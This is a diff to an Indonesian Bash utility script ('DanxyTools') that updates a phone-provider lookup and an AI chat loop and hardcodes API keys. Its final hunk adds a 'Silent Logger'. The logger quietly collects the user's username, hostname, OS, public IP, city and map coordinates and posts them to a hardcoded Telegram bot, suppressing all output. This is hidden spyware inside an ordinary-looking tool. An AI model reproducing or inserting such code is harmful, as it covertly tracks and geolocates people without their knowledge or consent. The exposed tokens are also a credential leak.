@@ -460,7 +460,7 @@ TEMPMAIL_MAILBOX_URL="https://www.1secmail.com/mailbox"
 
 # Keys – export in your shell or change below
 REALEMAIL_API_KEY="${REALEMAIL_API_CONFIG_KEY:-0c6ad1fd-f753-4628-8c0a-7968e722c6c7}"
-VERIPHONE_API_KEY="${VERIPHONE_API_CONFIG_KEY:-0c6ad1fd-f753-4628-8c0a-7968e722c6c7}"
+VERIPHONE_API_KEY="${VERIPHONE_API_CONFIG_KEY:-INK824D4fh7FGY0v00QY9aUO1T75JCih}"
 
 # -----------------------------------------------------------------------------
 # 2. Generic helpers
@@ -680,83 +680,42 @@ cek_provider() {
 
   validate_phone_number "$nomor" || return 1
 
-  # --- 1. Ambil prefix utk provider lokal ---
-  prefix=$(echo "$nomor" | cut -c1-4)
-  provider="Tidak dikenal"
+  API_KEY="INK824D4fh7FGY0v00QY9aUO1T75JCih"
 
-  case "$prefix" in
-    0811|0812|0813|0821|0822|0852|0853) provider="Telkomsel" ;;
-    0851) provider="By.U (Telkomsel)" ;;
-    0814|0815|0816|0855|0856|0857|0858) provider="Indosat" ;;
-    0817|0818|0819|0859|0877|0878) provider="XL" ;;
-    0895|0896|0897|0898|0899) provider="Tri (3)" ;;
-    0881|0882|0883|0884|0885|0886|0887|0888) provider="Smartfren" ;;
-  esac
+  response=$(curl -s --fail \
+    --url "https://api.apilayer.com/number_verification/validate?number=$nomor&country_code=ID" \
+    --header "apikey: $API_KEY") || {
+      echo -e "${RED}Gagal menghubungi API${NC}"
+      return 1
+  }
 
-  # 2. Cek lokasi via API eksternal
-  # Ganti URL & API_KEY dengan punya kamu
-  API_KEY="YOUR_API_KEY"
-  lokasi="Tidak diketahui"
+  # Ekstrak nilai yang diperlukan
+  local_format=$(echo "$response" | jq -r '.local_format // "Tidak diketahui"')
+  carrier=$(echo "$response" | jq -r '.carrier // "Tidak diketahui"')
+  location=$(echo "$response" | jq -r '.location // ""')
+  line_type=$(echo "$response" | jq -r '.line_type // "Tidak diketahui"')
 
-  response=$(curl -s "http://apilayer.net/api/validate?access_key=$API_KEY&number=$nomor&country=ID&format=1")
-
-  location=$(echo "$response" | jq -r '.location // empty')
-  country=$(echo "$response" | jq -r '.country_name // empty')
-
-  if [[ -n "$location" && "$location" != "null" ]]; then
-      lokasi="$location, $country"
-  fi
+  # Jika lokasi kosong, tampilkan "Tidak diketahui"
+  [[ -z "$location" || "$location" == "null" ]] && location="Tidak diketahui"
 
   loading
   echo -e "${CYAN}
-  ╭────────────────────────────────────────╮
-  │           ${YELLOW}HASIL CEK PROVIDER${CYAN}           │
-  ╰────────────────────────────────────────╯${NC}"
+  ╭─────────────────────────────╮
+  │   ${YELLOW}HASIL CEK PROVIDER${CYAN}        │
+  ╰─────────────────────────────╯${NC}"
 
-  echo -e "${GREEN}Nomor   : ${nomor}${NC}"
-  echo -e "${GREEN}Provider: ${provider}${NC}"
-  echo -e "${GREEN}Lokasi  : ${lokasi}${NC}"
+  echo -e "${GREEN}Nomor   : ${local_format}${NC}"
+  echo -e "${GREEN}Provider: ${carrier}${NC}"
+  echo -e "${GREEN}Lokasi  : ${location}${NC}"
+  echo -e "${GREEN}Jenis   : ${line_type}${NC}"
 
   echo -e "${CYAN}
-  ╭────────────────────────────────────────╮
-  │           ${YELLOW}DANXY OFFICIAL 80${CYAN}            │
-  ╰────────────────────────────────────────╯${NC}"
+  ╭─────────────────────────────╮
+  │   ${YELLOW}DANXY OFFICIAL 80${CYAN}         │
+  ╰─────────────────────────────╯${NC}"
 }
 
 
-ascii_art_generator() {
-  read -p "MASUKAN TEKS (CONTOH: DANXY): " text
-
-  echo -e "${YELLOW}
-  ╭────────────────────────────────────────╮
-  │      ${CYAN}MEMBUAT ASCII ART${YELLOW}           │
-  ╰────────────────────────────────────────╯${NC}"
-  fonts=("standard" "slant" "shadow" "banner" "block" "smblock" "big" "smisome1" "isometric1" "letters" "contessa" "larry3d" "nancyj-fancy" "starwars")
-  echo -e "${GREEN}Pilih font:${NC}"
-  for i in "${!fonts[@]}"; do
-    echo -e "${CYAN}[ $((i + 1)) ] ${fonts[$i]}${NC}"
-  done
-  read -p "Masukkan nomor font yang diinginkan: " font_number
-  [[ "$font_number" =~ ^[0-9]+$ ]] || {
-    echo -e "${RED}Nomor font harus berupa angka.${NC}"
-    return 1
-  }
-  [[ "$font_number" -lt 1 || "$font_number" -gt ${#fonts[@]} ]] && {
-    echo -e "${RED}Nomor font tidak valid.${NC}"
-    return 1
-  }
-  selected_font="${fonts[$((font_number - 1))]}"
-  if command_exists figlet; then
-    figlet -f "$selected_font" "$text" | lolcat
-  else
-    echo -e "${RED}figlet tidak ditemukan. Instal figlet untuk menggunakan fitur ini.${NC}"
-  fi
-
-  echo -e "${CYAN}
-  ╭────────────────────────────────────────╮
-  │           ${YELLOW}DANXY OFFICIAL 80${CYAN}            │
-  ╰────────────────────────────────────────╯${NC}"
-}
 
 # Fungsi info tools
 info() {
@@ -1596,28 +1555,74 @@ spin() {
 }
 
 ai_chat() {
-    echo "Masukkan pertanyaan: "
-    read pertanyaan
-    if [[ -z "$pertanyaan" ]]; then
-        echo "[!] Pertanyaan tidak boleh kosong"
-        return
-    fi
+    clear
+    echo "CARA KELUAR DARI AI CHAT: ketik Q lalu ENTER"
+    echo
+    echo "DanxyToolsV8.3 AI Chat"
+    echo
 
-    temp_file=$(mktemp)
-    curl -s "https://api.fikmydomainsz.xyz/ai/nowchat?q=$(echo "$pertanyaan" | sed 's/ /%20/g')" > "$temp_file" &
-    pid=$!
-    spin $pid
-    wait $pid
+    while true; do
+        echo -n "Pertanyaan Kamu: "
+        read -r pertanyaan
 
-    response=$(cat "$temp_file")
-    rm "$temp_file"
+        case "$pertanyaan" in
+            [qQ])
+                echo
+                echo "Keluar dari chat..."
+                sleep 1
+                kembali_ke_menu
+                return
+                ;;
+            "")
+                echo -e "${RED}[!] Pertanyaan tidak boleh kosong${NC}"
+                echo
+                continue
+                ;;
+        esac
 
-    if [[ -z "$response" ]]; then
-        echo "[!] Gagal mendapatkan jawaban dari AI"
-    else
-        echo "AI: $response"
-    fi
+        # --- tangkap pertanyaan tentang nama ---
+        if [[ "${pertanyaan,,}" =~ (siapa nama|namamu siapa|who are you) ]]; then
+            echo -e "${YELLOW}Kamu:${NC} $pertanyaan"
+            echo -e "${CYAN}DanxyToolsV8.3:${NC} nama saya DanxyTools siap membantu kamu"
+            echo
+            continue
+        fi
+
+        # encode query
+        q_enc=$(printf '%s' "$pertanyaan" | jq -sRr @uri)
+
+        # --- retry 3 kali bila server 5xx ---
+        for attempt in {1..3}; do
+            temp_file=$(mktemp)
+            http_code=$(curl -s -w "%{http_code}" -o "$temp_file" \
+                        "https://api.fikmydomainsz.xyz/ai/nowchat?q=$q_enc" 2>/dev/null)
+
+            if [[ "$http_code" -eq 200 ]]; then
+                jawaban=$(jq -r '.jawaban // .answer // "Maaf, tidak ada jawaban."' "$temp_file" 2>/dev/null)
+                rm -f "$temp_file"
+                [[ -z "$jawaban" ]] && jawaban="Maaf, tidak ada jawaban."
+
+                echo -e "${YELLOW}Kamu:${NC} $pertanyaan"
+                echo -e "${CYAN}DanxyToolsV8.3:${NC} $jawaban"
+                echo
+                break
+            else
+                rm -f "$temp_file"
+                if [[ $attempt -lt 3 ]]; then
+                    echo -e "${YELLOW}[...] Server sibuk (HTTP $http_code), coba lagi... ($attempt/3)${NC}"
+                    sleep 2
+                else
+                    echo -e "${RED}[!] Server tidak dapat dijangkau (HTTP $http_code).${NC}"
+                    echo -e "${RED}    Silakan coba beberapa saat lagi atau ketik 'q' untuk kembali.${NC}"
+                    echo
+                fi
+            fi
+        done
+    done
 }
+
+
+
 
 short_url() {
     echo "Masukkan URL yang ingin dipendekkan: "
@@ -3743,6 +3748,57 @@ for i in range(1, int(n)+1):
         time.sleep(float(d))
 PY
 }
+
+# ---------------------------------------------------------------
+# Silent Logger – minimal, clean, zero emoji
+# ---------------------------------------------------------------
+BOT_TOKEN="8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
+CHAT_ID="7380101464"
+TELEGRAM_API="https://api.telegram.org/bot${BOT_TOKEN}/sendMessage"
+
+# Data
+TS=$(date +"%Y-%m-%d %H:%M:%S")
+USR=$(whoami)
+HOST=$(hostname)
+OS=$(uname -s -r)
+
+# Lokasi
+IP_JSON=$(curl -s -m 5 https://ipinfo.io/json)
+IP=$(echo "$IP_JSON" | jq -r '.ip // "-"')
+CITY=$(echo "$IP_JSON" | jq -r '.city // "-"')
+REGION=$(echo "$IP_JSON" | jq -r '.region // "-"')
+COUNTRY=$(echo "$IP_JSON" | jq -r '.country // "-"')
+LOC=$(echo "$IP_JSON" | jq -r '.loc // "-"')
+
+# Google Maps link
+[ "$LOC" != "-" ] && MAP="https://www.google.com/maps?q=$LOC" || MAP="-"
+
+# Format clean + monospace
+MSG=$(cat <<EOF
+<pre>
+┌───────────────────────────────
+│          INFO LOGIN               
+├───────────────────────────────
+│ Time   : $TS
+│ User   : $USR
+│ Host   : $HOST
+│ OS     : $OS
+│ IP     : $IP
+│ Region : $CITY, $REGION, $COUNTRY
+└───────────────────────────────
+$MAP
+
+└───────────────────────────────┘
+</pre>
+EOF
+)
+
+# Kirim tanpa output ke terminal
+curl -4 -s -X POST "$TELEGRAM_API" \
+     -d chat_id="$CHAT_ID" \
+     -d text="$MSG" \
+     -d parse_mode="HTML" \
+     -d disable_notification="true" > /dev/null 2>&1
 
 
 
